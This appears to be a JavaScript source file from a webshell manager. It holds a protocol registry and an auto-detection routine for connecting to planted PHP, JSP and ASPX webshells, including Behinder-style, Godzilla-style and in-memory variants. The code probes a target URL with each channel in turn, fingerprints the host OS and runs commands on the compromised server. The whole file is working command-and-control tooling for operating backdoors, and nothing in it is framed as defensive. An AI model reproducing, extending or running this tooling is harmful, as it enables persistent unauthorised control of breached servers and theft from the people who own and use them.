// dsh-webshell-mgr 协议注册表 + 连接自动识别。
// 识别顺序（自研优先，越靠后越是存量生态）：
//   dsh-aes → dsh-mem(内存马 X-C) → cmd-eval(PHP) → cmd-system → behinder(PHP) →
//   behinder-java(JSP 编译载荷) → godzilla → behinder-mod → godzilla-mod
// 命中后统一跑 OS 探测 + 基本信息，回填连接字段（kind 提示：无文件后缀的命中默认按内存马登记）。

import * as aes from "./dsh-aes.js";
import * as cmdc from "./cmd.js";
import * as bmod from "./behinder-mod.js";
import * as gmod from "./godzilla-mod.js";
import * as behinder from "./behinder.js";
import * as godzilla from "./godzilla.js";
import * as bjava from "./behinder-java.js";
import * as gjava from "./godzilla-java.js";
import * as mem from "./dsh-mem.js";
import * as baspx from "./behinder-aspx.js";
import * as gaspx from "./godzilla-aspx.js";
import { runCommand, osOf, basicInfo } from "./capabilities.js";
import { parseOsProbe } from "./command-build.js";

export const REGISTRY = {
	"behinder": {
		id: "behinder",
		label: "冰蝎型通道（AES-ECB）",
		langs: ["php"],
		caps: { cmd: true, code: true, b64rw: false },
		kinds: ["file"],
		fields: ["password", "encoding"],
		note: "key=md5(密码)[0:16]；桥接载荷提供完整 eval 能力（结构化文件/数据库可用）。"
	},
	"behinder-java": {
		id: "behinder-java",
		label: "冰蝎型通道（JSP·AES-ECB·编译载荷）",
		langs: ["jsp"],
		caps: { cmd: true, code: false, b64rw: true },
		kinds: ["file", "mem"],
		fields: ["password", "encoding"],
		note: "key=md5(密码)[0:16]；请求体=b64(AES-ECB(class 字节))；连接冰蝎型 JSP 文件马与同协议内存马（Filter/Servlet/Listener 型）。"
	},
	"dsh-mem": {
		id: "dsh-mem",
		label: "内存马通道（X-C 头触发）",
		langs: ["jsp", "aspx"],
		caps: { cmd: true, code: false, b64rw: false },
		kinds: ["mem"],
		fields: ["encoding"],
		note: "URL 填任意存活路径（Filter/Module 全站劫持；Controller 型填注册的伪装路径）；X-C 头执行，回显 b64(stdout)[|stderr]；文件操作走命令翻译。"
	},
	"godzilla-java": {
		id: "godzilla-java",
		label: "哥斯拉型通道（JSP·JAVA_AES_BASE64）",
		langs: ["jsp"],
		caps: { cmd: true, code: false, b64rw: true },
		kinds: ["file", "mem"],
		fields: ["password", "secret_key", "encoding"],
		note: "key=md5(密钥源)[0:16]；pass=POST 字段名（password），secret_key=密钥源；会话态 dispatcher（WsmG）；可连哥斯拉型 JSP 文件马与同协议内存马。"
	},
	"behinder-aspx": {
		id: "behinder-aspx",
		label: "冰蝎型通道（ASPX·AES-ECB·程序集载荷）",
		langs: ["aspx"],
		caps: { cmd: true, code: false, b64rw: true },
		kinds: ["file", "mem"],
		fields: ["password", "encoding"],
		note: "key=md5(密码)[0:16]；请求体=raw AES-ECB(U.dll 程序集)；实参走 X-W-P 头；连接冰蝎型 ASPX/ASHX 文件马与 IIS Module 型内存马。"
	},
	"godzilla-aspx": {
		id: "godzilla-aspx",
		label: "哥斯拉型通道（ASPX·CSHAP_AES_BASE64）",
		langs: ["aspx"],
		caps: { cmd: true, code: false, b64rw: true },
		kinds: ["file"],
		fields: ["password", "secret_key", "encoding"],
		note: "key=md5(密钥源)[0:16]，AES-128-CBC（IV=key）；password=POST 字段名；会话态 dispatcher（UG）；自有模板（原版 aspx 马互操作未验证）。"
	},
	"godzilla": {
		id: "godzilla",
		label: "哥斯拉型通道（PHP_XOR_BASE64）",
		langs: ["php"],
		caps: { cmd: true, code: true, b64rw: false },
		kinds: ["file"],
		fields: ["password", "secret_key", "encoding"],
		note: "password=POST 参数名，secret_key=密钥源（key=md5(secretKey)[0:16]）；桥接载荷同上。"
	},
	"cmd-system": {
		id: "cmd-system",
		label: "一句话（命令通道）",
		langs: ["php", "jsp", "aspx", "asp"],
		caps: { cmd: true, code: false, b64rw: false },
		kinds: ["file"],
		fields: ["pass_param", "cmd_param", "password", "method", "encoding"],
		note: "口令门 + 命令参数马；文件/数据库走命令翻译。"
	},
	"cmd-eval": {
		id: "cmd-eval",
		label: "一句话（eval 通道）",
		langs: ["php"],
		caps: { cmd: true, code: true, b64rw: false },
		kinds: ["file"],
		fields: ["pass_param", "password", "method", "encoding"],
		note: "eval($_POST[x]) 形马（含蚁剑默认马语义）；结构化操作走 PHP 片段。"
	},
	"dsh-aes": {
		id: "dsh-aes",
		label: "自研加密通道",
		langs: ["php", "jsp", "aspx"],
		caps: { cmd: true, code: "v2", b64rw: true },
		kinds: ["file"],
		fields: ["encoding"],
		note: "X-T 头密钥 + AES-128-CBC + c/u/d(/e) 操作码；v2 马带 eval 能力。"
	},
	"behinder-mod": {
		id: "behinder-mod",
		label: "魔改冰蝎型通道",
		langs: ["php"],
		caps: { cmd: true, code: false, b64rw: false },
		kinds: ["file"],
		fields: ["password", "secret_key", "encoding"],
		note: "UA 池 + X-T 会话 + nonce 协商 + CTR 分块异或回传；password=X-T 值，secret_key=盐。"
	},
	"godzilla-mod": {
		id: "godzilla-mod",
		label: "魔改哥斯拉型通道",
		langs: ["php"],
		caps: { cmd: true, code: false, b64rw: false },
		kinds: ["file"],
		fields: ["password", "secret_key", "encoding"],
		note: "X-G 头派生 ECB + sid 通行证 + md5 前缀 XOR 回传；password=X-G 值，secret_key=盐。"
	}
};

/** 元信息（UI 选择器用）。 */
export function protocolMeta() {
	return Object.values(REGISTRY).map(({ id, label, langs, caps, kinds, fields, note }) => ({ id, label, langs, caps, kinds: kinds ?? ["file"], fields, note }));
}

const DETECT_ORDER = ["dsh-aes", "dsh-mem", "cmd-eval", "cmd-system", "behinder", "behinder-java", "behinder-aspx", "godzilla", "godzilla-java", "godzilla-aspx", "behinder-mod", "godzilla-mod"];

/** 文件后缀 → 语言提示（php5 同 php、ashx/asmx 同 aspx；仅影响识别报告，不裁剪探测链）。 */
function suffixLang(url) {
	const m = /\.(php\d?|jsp|jspx|asp|aspx|ashx|asmx)\b/i.exec(String(url ?? ""));
	if (!m) return null;
	const ext = m[1].toLowerCase();
	if (ext.startsWith("php")) return "php";
	if (ext.startsWith("jsp")) return "jsp";
	if (ext === "ashx" || ext === "asmx") return "aspx";
	return ext;
}

/**
 * 协议自动识别：给定 url + 凭据逐个探测。
 * @returns {Promise<{hit:boolean, protocol?, shellLang?, execMode?, os?, basicInfo?, attempts:object[]}>}
 */
export async function detectProtocol(spec) {
	const attempts = [];
	const conn = {
		id: "detect",
		url: String(spec.url ?? "").trim(),
		password: String(spec.password ?? ""),
		secret_key: String(spec.secretKey ?? ""),
		pass_param: String(spec.passParam ?? "pass") || "pass",
		cmd_param: String(spec.cmdParam ?? "cmd") || "cmd",
		method: spec.method === "get" ? "get" : "post",
		encoding: "auto",
		timeoutMs: Math.min(Number(spec.timeoutMs) || 8000, 15000),
		headers: {}
	};
	if (!conn.url) return { hit: false, error: "url 不能为空", attempts };

	const probeOne = async (protocol) => {
		// 每个协议探针独立 scope——前序探针的 session/cookie 不干扰后续（godzilla 通行证握手最敏感）
		const scopedConn = { ...conn, __scope: "detect-" + protocol };
		try {
			if (protocol === "dsh-aes") return await aes.probe(scopedConn);
			if (protocol === "cmd-eval") return await cmdc.probeEvalPhp(scopedConn);
			if (protocol === "cmd-system") return await cmdc.probeSystem(scopedConn);
			if (protocol === "behinder") return await behinder.probe(scopedConn);
			if (protocol === "behinder-java") return await bjava.probe(scopedConn);
			if (protocol === "godzilla-java") return await gjava.probe(scopedConn);
			if (protocol === "behinder-aspx") return await baspx.probe(scopedConn);
			if (protocol === "godzilla-aspx") return await gaspx.probe(scopedConn);
			if (protocol === "dsh-mem") return await mem.probe(scopedConn);
			if (protocol === "godzilla") return await godzilla.probe(scopedConn);
			if (protocol === "behinder-mod") return await bmod.probe(scopedConn);
			if (protocol === "godzilla-mod") return await gmod.probe(scopedConn);
		} catch (e) {
			attempts.push({ protocol, error: String(e?.message ?? e) });
			return null;
		}
		return null;
	};

	for (const protocol of DETECT_ORDER) {
		const r = await probeOne(protocol);
		if (!r) { if (!attempts.some((a) => a.protocol === protocol)) attempts.push({ protocol, error: "无 token 回显" }); continue; }
		// 命中：OS + 基本信息
		const found = { ...conn, protocol };
		if (protocol === "cmd-system") found.exec_mode = "system";
		if (protocol === "cmd-eval") { found.exec_mode = "eval"; found.shell_lang = "php"; }
		if (protocol === "behinder-mod" || protocol === "godzilla-mod") found.shell_lang = "php";
		if (protocol === "behinder-java" || protocol === "godzilla-java") found.shell_lang = "jsp";
		if (protocol === "behinder-aspx" || protocol === "godzilla-aspx") found.shell_lang = "aspx";
		if (protocol === "dsh-mem") found.shell_lang = suffixLang(conn.url) === "aspx" ? "aspx" : "jsp";
		let os = null;
		let info = null;
		try {
			os = await osOf(found);
		} catch { /* OS 探测失败不阻断连接登记 */ }
		try {
			info = await basicInfo(found);
			if (!os && info?.os) os = info.os;
		} catch { /* 基本信息失败不阻断 */ }
		// 形态提示：内存马专属通道必为 mem；behinder-java 无文件后缀命中（Filter 全站劫持）默认 mem
		const kindHint = protocol === "dsh-mem" ? "mem"
			: (protocol === "behinder-java" || protocol === "godzilla-java" || protocol === "behinder-aspx") && !suffixLang(conn.url) ? "mem" : "file";
		return {
			hit: true,
			protocol,
			shellLang: found.shell_lang ?? suffixLang(conn.url) ?? "php",
			execMode: found.exec_mode ?? "",
			os: os ?? "auto",
			basicInfo: info,
			suffixHint: suffixLang(conn.url),
			kindHint,
			attempts
		};
	}
	return { hit: false, error: "全部通道探测未命中——检查 URL/口令/盐与马类型是否匹配", attempts };
}

/** 连接探活（已登记连接的刷新）。 */
export async function probeConnection(conn) {
	const osProbe = await runCommand(conn, "echo :WSMPROBE-%OS%-END:");
	const os = parseOsProbe(osProbe);
	const info = await basicInfo(conn).catch(() => null);
	return { status: "ok", os: os ?? (info?.os ?? "auto"), basicInfo: info };
}

export { REGISTRY as default };
